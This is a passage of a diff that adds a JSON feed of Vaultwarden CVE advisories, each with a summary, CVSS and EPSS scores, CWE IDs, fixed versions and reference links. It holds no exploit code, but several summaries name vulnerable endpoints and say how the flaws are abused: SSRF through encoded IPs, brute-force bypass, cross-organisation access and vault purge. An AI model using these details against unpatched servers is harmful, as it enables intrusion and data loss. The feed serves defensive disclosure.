+      "summary": "Vaultwarden is a Bitwarden-compatible server written in Rust. Prior to 1.36.0, Vaultwarden's /icons/{domain}/icon.png endpoint used src/http_client.rs checks including should_block_address() and post_resolve() that missed decimal, hexadecimal, and octal IP representations, allowing SSRF through the icon-fetching HTTP client for blind internal network or port discovery. This issue is fixed in version 1.36.0.",
+      "published_at": "2026-05-19T21:27:25.000Z",
+      "modified_at": "2026-07-15T15:41:42.401Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00291,
+        "percentile": 0.21925,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-918",
+        "CWE-1389"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.36.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-72vh-x5jq-m82g",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/pull/7162",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/commit/a354e57659d26149fde0d91b76f83fce94e8f277",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/releases/tag/1.36.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-47160",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-47160",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-47160",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-47160",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-72vh-x5jq-m82g",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-72vh-x5jq-m82g",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:bd9ba72d8abb37b45f690876e88a920359932eb978d621f4e0c0d05a0c962a3d",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-33420",
+      "aliases": [
+        "GHSA-jjxg-p3v6-52ww"
+      ],
+      "title": "Vaultwarden missing authorization check allows Manager-role users to enumerate all collections",
+      "summary": "Vaultwarden is a Bitwarden-compatible server written in Rust. In version 1.35.4 and earlier, the get_org_collections_details endpoint (GET /api/organizations/{org_id}/collections/details) is missing the has_full_access() authorization check that exists on the sibling get_org_collections endpoint. This allows any Manager-role user with accessAll=False and no collection assignments to retrieve the names, UUIDs, user-to-collection mappings, and group-to-collection mappings for all collections in the organization. This issue has been fixed in version 1.35.5.",
+      "published_at": "2026-04-26T12:23:40.000Z",
+      "modified_at": "2026-05-06T14:24:04.636Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.3,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.0017,
+        "percentile": 0.06414,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-862"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.35.5"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-jjxg-p3v6-52ww",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/releases/tag/1.35.5",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-33420",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-33420",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-33420",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-33420",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-jjxg-p3v6-52ww",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-jjxg-p3v6-52ww",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:ee7adee3c09808dc4c82b26c5cf54f1149418a732ce0eb324850738ab79c7489",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-43914",
+      "aliases": [
+        "GHSA-c5rv-q295-7w4g"
+      ],
+      "title": "Vaultwarden: Brute-force protection bypass vulnerability",
+      "summary": "Vaultwarden is a Bitwarden-compatible server written in Rust. Prior to 1.35.4, there is a security vulnerability in Vaultwarden that allows bypassing the login brute-force protection if email 2fa is enabled. If email 2fa is enabled, the unprotected 2fa-function send_email_login (email.rs, api endpoint /api/two-factor/send-email-login) also acts as an oracle determining whether a username-password combination is correct. An attacker can abuse that endpoint to brute-force passwords without rate-limiting. This works even for users who don't have email 2fa configured. This vulnerability is fixed in 1.35.4.",
+      "published_at": "2026-04-25T21:05:10.000Z",
+      "modified_at": "2026-05-12T12:51:49.183Z",
+      "severity": {
+        "level": "high",
+        "score": 7.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00288,
+        "percentile": 0.21626,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-307"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.35.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-c5rv-q295-7w4g",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/pull/6867",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/releases/tag/1.35.4",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-43914",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-43914",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-43914",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-43914",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-c5rv-q295-7w4g",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-c5rv-q295-7w4g",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:62a5d7f639c2dd832bcbdf7c63b05c3813fca29f5945513bdf82d60970607516",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-43913",
+      "aliases": [
+        "GHSA-937x-3j8m-7w7p"
+      ],
+      "title": "Vaultwarden: Unconfirmed Owner Can Purge Entire Organization Vault",
+      "summary": "Vaultwarden is a Bitwarden-compatible server written in Rust. Prior to 1.35.5, Vaultwarden allows an unconfirmed organization owner to purge the entire organization vault. The organization invite flow uses a two-step process: accepting an invite transitions membership from Invited to Accepted, and a separate confirmation by an existing owner upgrades it to Confirmed. The POST /api/ciphers/purge endpoint uses plain Headers and only checks that the membership type is Owner without verifying that the membership status is Confirmed. An authenticated user who has been invited as an organization owner and has accepted the invite and has not yet been confirmed can call this endpoint to hard-delete all ciphers and attachments in the organization,\ncausing immediate organization-wide data loss. This vulnerability is fixed in 1.35.5.",
+      "published_at": "2026-04-25T20:49:36.000Z",
+      "modified_at": "2026-05-15T18:25:39.135Z",
+      "severity": {
+        "level": "high",
+        "score": 8.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00267,
+        "percentile": 0.18971,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.35.5"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-937x-3j8m-7w7p",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-43913",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-43913",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-43913",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-43913",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-937x-3j8m-7w7p",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-937x-3j8m-7w7p",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:6ca230956fc8d1a6f79c1800c795f1ec7fdcded761011e4bfd28c1bb12205ca4",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-43912",
+      "aliases": [
+        "GHSA-569v-845w-g82p"
+      ],
+      "title": "Vaultwarden: Cross-Org Group Binding Enables Unauthorized Read And Write Access Into Another Organization",
+      "summary": "Vaultwarden is a Bitwarden-compatible server written in Rust. Prior to 1.35.5, Vaultwarden does not enforce that a groups_users.users_organizations_uuid entry belongs to the same organization as groups.groups_uuid, or a collections_groups.collections_uuid entry belongs to the same organization as collections_groups.groups_uuid. Multiple organization group-management endpoints accept arbitrary MembershipId and CollectionId values and persist them directly without verifying org consistency. This lets an attacker who is Admin in Organization A, and only a low-privileged member in Organization B bind their Org B membership UUID into an Org A group, then use that foreign group relationship to gain unauthorized access to Org B vault data. With an accessAll=true Org A group, the attacker can make /api/sync and /api/ciphers enumerate Org B ciphers. Once those unauthorized sync results reveal Org B collection IDs, the attacker can also bind those foreign collection IDs to the Org A group and turn the same flaw into write access over Org B items. This vulnerability is fixed in 1.35.5.",
+      "published_at": "2026-04-25T20:49:32.000Z",
+      "modified_at": "2026-05-12T13:19:50.689Z",
+      "severity": {
+        "level": "high",
+        "score": 8.7,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00289,
+        "percentile": 0.21738,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-285"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.35.5"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-569v-845w-g82p",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-43912",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-43912",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-43912",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-43912",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-569v-845w-g82p",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-569v-845w-g82p",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:6ca230956fc8d1a6f79c1800c795f1ec7fdcded761011e4bfd28c1bb12205ca4",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-43911",
+      "aliases": [
+        "GHSA-6j4w-g4jh-xjfx"
+      ],
+      "title": "Vaultwarden: Refresh tokens not invalidated on security stamp rotation",
+      "summary": "Vaultwarden is a Bitwarden-compatible server written in Rust. Prior to 1.35.5, refresh tokens are not invalidated when the user's security_stamp is rotated by some security-sensitive operations (password change, KDF change, key rotation, email change, org admin password reset, emergency access takeover). This allows an attacker holding a previously obtained refresh token to maintain session access even after the user has taken action to secure their account. This vulnerability is fixed in 1.35.5.",
+      "published_at": "2026-04-25T20:49:19.000Z",
+      "modified_at": "2026-05-12T16:44:07.823Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.8,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00216,
+        "percentile": 0.12055,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-613"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.35.5"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-6j4w-g4jh-xjfx",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-43911",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-43911",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-43911",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-43911",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-6j4w-g4jh-xjfx",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-6j4w-g4jh-xjfx",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:ee7adee3c09808dc4c82b26c5cf54f1149418a732ce0eb324850738ab79c7489",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-31835",
+      "aliases": [
+        "GHSA-x7g7-cgx5-jhx2"
+      ],
+      "title": "Vaultwarden WebAuthn credential metadata tampered before signature verification",
+      "summary": "Vaultwarden is a Bitwarden-compatible server written in Rust. In versions 1.35.4 and earlier, the WebAuthn authentication flow in `validate_webauthn_login()` updates persistent credential metadata (1backup_eligible1 and 1backup_state flags1) based on unverified `authenticatorData` before signature validation is performed. An attacker who knows a user's password but cannot produce a valid WebAuthn signature can permanently modify the stored backup flags for that user's credential. If signature verification fails, the database update is not rolled back. This can result in a persistent denial of service of WebAuthn two-factor authentication for affected credentials. This issue has been fixed in version 1.35.5.",
+      "published_at": "2026-04-25T20:48:06.000Z",
+      "modified_at": "2026-05-06T12:46:11.308Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.3,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00151,
+        "percentile": 0.04297,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-345"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.35.5"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-x7g7-cgx5-jhx2",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/releases/tag/1.35.5",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-31835",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-31835",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-31835",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-31835",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-x7g7-cgx5-jhx2",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-x7g7-cgx5-jhx2",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:ee7adee3c09808dc4c82b26c5cf54f1149418a732ce0eb324850738ab79c7489",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-27898",
+      "aliases": [
+        "GHSA-w9f8-m526-h7fh"
+      ],
+      "title": "Vaultwarden: Unauthorized Access via Partial Update API on Another User’s Cipher",
+      "summary": "Vaultwarden is an unofficial Bitwarden compatible server written in Rust, formerly known as bitwarden_rs. Prior to version 1.35.4, an authenticated regular user can specify another user’s cipher_id and call \"PUT /api/ciphers/{id}/partial\" Even though the standard retrieval API correctly denies access to that cipher, the partial update endpoint returns 200 OK and exposes cipherDetails (including name, notes, data, secureNote, etc.). This issue has been patched in version 1.35.4.",
+      "published_at": "2026-03-04T18:57:27.000Z",
+      "modified_at": "2026-03-05T15:42:31.635Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.4,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.0019,
+        "percentile": 0.08725,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-639"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.35.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-w9f8-m526-h7fh",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-w9f8-m526-h7fh",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-27898",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-27898",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-27898",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-27898",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-w9f8-m526-h7fh",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-w9f8-m526-h7fh",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:10651a9939e3b8b2322650d7a0ebc7a6a1dd5e0365a6d0250f4638b3c96d9289",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-27801",
+      "aliases": [
+        "GHSA-v6pg-v89r-w8wr"
+      ],
+      "title": "Vaultwarden: 2FA Bypass on Protected Actions due to Faulty Rate Limit Enforcement",
+      "summary": "Vaultwarden is an unofficial Bitwarden compatible server written in Rust, formerly known as bitwarden_rs. Vaultwarden versions 1.34.3 and prior are susceptible to a 2FA bypass when performing protected actions. An attacker who gains authenticated access to a user’s account can exploit this bypass to perform protected actions such as accessing the user’s API key or deleting the user’s vault and organisations the user is an admin/owner of . This issue has been patched in version 1.35.0.",
+      "published_at": "2026-03-04T18:57:19.000Z",
+      "modified_at": "2026-03-05T15:30:50.274Z",
+      "severity": {
+        "level": "medium",
+        "score": 6,
+        "vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00287,
+        "percentile": 0.21484,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-307"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.35.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-v6pg-v89r-w8wr",
+          "type": "advisory"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27801",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-v6pg-v89r-w8wr",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-27801",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-27801",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-27801",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-27801",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-v6pg-v89r-w8wr",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-v6pg-v89r-w8wr",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:8835a48c8dd19df6ecfa679a68356fed58c1f81318becdc84a4d86dc32cd8ae1",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-27802",
+      "aliases": [
+        "GHSA-r32r-j5jq-3w4m"
+      ],
+      "title": "Vaultwarden: Privilege Escalation via Bulk Permission Update to Unauthorized Collections by Manager",
+      "summary": "Vaultwarden is an unofficial Bitwarden compatible server written in Rust, formerly known as bitwarden_rs. Prior to version 1.35.4, there is a privilege escalation vulnerability via bulk permission update to unauthorized collections by Manager. This issue has been patched in version 1.35.4.",
+      "published_at": "2026-03-04T18:57:11.000Z",
+      "modified_at": "2026-03-05T15:42:42.152Z",
+      "severity": {
+        "level": "high",
+        "score": 8.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00333,
+        "percentile": 0.26879,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-269",
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.35.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-r32r-j5jq-3w4m",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-r32r-j5jq-3w4m",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-27802",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-27802",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-27802",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-27802",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-r32r-j5jq-3w4m",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-r32r-j5jq-3w4m",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:62a5d7f639c2dd832bcbdf7c63b05c3813fca29f5945513bdf82d60970607516",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-27803",
+      "aliases": [
+        "GHSA-h4hq-rgvh-wh27"
+      ],
+      "title": "Vaultwarden: Collection Management Operations Allowed Without `manage` Verification for Manager Role",
+      "summary": "Vaultwarden is an unofficial Bitwarden compatible server written in Rust, formerly known as bitwarden_rs. Prior to version 1.35.4, when a Manager has manage=false for a given collection, they can still perform several management operations as long as they have access to the collection. This issue has been patched in version 1.35.4.",
+      "published_at": "2026-03-04T18:56:56.000Z",
+      "modified_at": "2026-03-05T15:42:36.935Z",
+      "severity": {
+        "level": "high",
+        "score": 8.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00333,
+        "percentile": 0.2688,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-269",
+        "CWE-285",
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.35.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-h4hq-rgvh-wh27",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-h4hq-rgvh-wh27",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-27803",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-27803",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-27803",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-27803",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-h4hq-rgvh-wh27",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-h4hq-rgvh-wh27",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:62a5d7f639c2dd832bcbdf7c63b05c3813fca29f5945513bdf82d60970607516",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-26012",
+      "aliases": [
+        "GHSA-h265-g7rm-h337"
+      ],
+      "title": "vaultwarden has Full Cipher Enumeration Ignoring Organization Collection Permissions",
+      "summary": "vaultwarden is an unofficial Bitwarden compatible server written in Rust, formerly known as bitwarden_rs. Prior to 1.35.3, a regular organization member can retrieve all ciphers within an organization, regardless of collection permissions. The endpoint /ciphers/organization-details is accessible to any organization member and internally uses Cipher::find_by_org to retrieve all ciphers. These ciphers are returned with CipherSyncType::Organization without enforcing collection-level access control. This vulnerability is fixed in 1.35.3.",
+      "published_at": "2026-02-11T20:56:42.000Z",
+      "modified_at": "2026-02-12T21:15:25.318Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00467,
+        "percentile": 0.41,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.35.3"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-h265-g7rm-h337",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/releases/tag/1.35.3",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-26012",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-26012",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-26012",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-26012",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-h265-g7rm-h337",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-h265-g7rm-h337",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:884e48f648698c98bb2f4a7ffc7c89a052cf39a561b46f47624aa3b3bb4e11b0",
+      "note": null
+    }
+  ]
+}
